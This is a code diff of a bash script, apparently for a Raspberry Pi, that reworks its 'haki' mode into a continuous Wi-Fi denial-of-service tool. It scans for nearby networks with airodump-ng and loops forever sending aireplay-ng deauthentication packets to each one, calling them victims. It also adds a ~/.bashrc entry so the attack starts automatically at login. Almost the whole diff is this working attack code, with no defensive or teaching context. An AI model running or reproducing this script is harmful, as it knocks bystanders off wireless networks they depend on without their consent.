@@ -26,14 +26,6 @@ main()
   fi
 }
 
-clean_up_junk()
-{
-	if [ -d ""$working_folder"/perish_dump" ]
-	then
-		rm -rf "$working_folder"/perish_dump
-	fi
-}
-
 create_working_folder()
 {
 	if [ ! -d ""$working_folder"/perish_dump" ]
@@ -100,7 +92,8 @@ menu()
 		4 )
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
-				echo "./rasperish/rasperi.sh --haki" >> ~/.bashrc
+				#include 5 seconds for safety
+				echo "sleep 5; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
 			fi
 			#reboot
 			;;
@@ -127,33 +120,36 @@ disable_autologin()
 
 haki()
 {
+	clear
 
-	#scan for n seconds
-	scan 15
-
-	echo "	[i] Continuously attacking these networks... "
+	#create the working directory, where we save our scan files temporarily
+	create_working_folder
+	
+	echo "	[i] Continuously scanning for networks... "
 	echo
+	
+	#scan every n seconds
+	scan 10
 
-	local i=1
-
-	while read essid
+	while true
 	do
-		#get each corresponding channel for every essid found
-		channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
-
-		echo "	[+] Synchronising card to channel: $channel"
-		#sync the card to the victim's channel
-		iwconfig $interface channel $channel
-
-		echo "	[+] Attacking $essid"
-		#send some deauth packets to each wifi network
-		aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
-
-		((i++))
-	done < "$working_folder"/perish_dump/essids
-
-	#loop when you are done
-	haki
+		local i=1
+		while read essid
+		do
+			#get each corresponding channel for every essid found
+			channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
+	
+			echo "	[+] Synchronising card to channel: $channel"
+			#sync the card to the victim's channel
+			iwconfig $interface channel $channel
+	
+			echo "	[+] Attacking $essid"
+			#send some deauth packets to each wifi network
+			aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
+	
+			((i++))
+		done < "$working_folder"/perish_dump/essids
+	done #loop when you are done
 }
 
 stop_mon()
@@ -171,20 +167,28 @@ start_mon()
 
 scan()
 {
-	clear
-
-	#each time there is a scan, clean up previous ones
-	clean_up_junk
-
-	#create the working directory, where we save our scan files temporarily
-	create_working_folder
-	
 	scan_interval=$1
-	timeout $scan_interval airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" > /dev/null 2>&1
+	
+	#start data dumping every n seconds
+	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval &
+	
+	#start chopping the data in a desirable format every n seconds
+	scan_data_chopper $scan_interval &
+	
+	#add an initial hysteresis before starting in order to have data ready
+	sleep $scan_interval
+}
 
-	awk -F "\"*;\"*" '{print $4}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/bssids
-	awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/essids
-	awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/channels
+scan_data_chopper()
+{
+	while true
+	do
+		#sleep on first loop because you must wait for data
+		sleep $1
+		awk -F "\"*;\"*" '{print $4}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/bssids
+		awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/essids
+		awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/channels
+	done
 }
 
 #Here starts the script and passes the flag argument to it
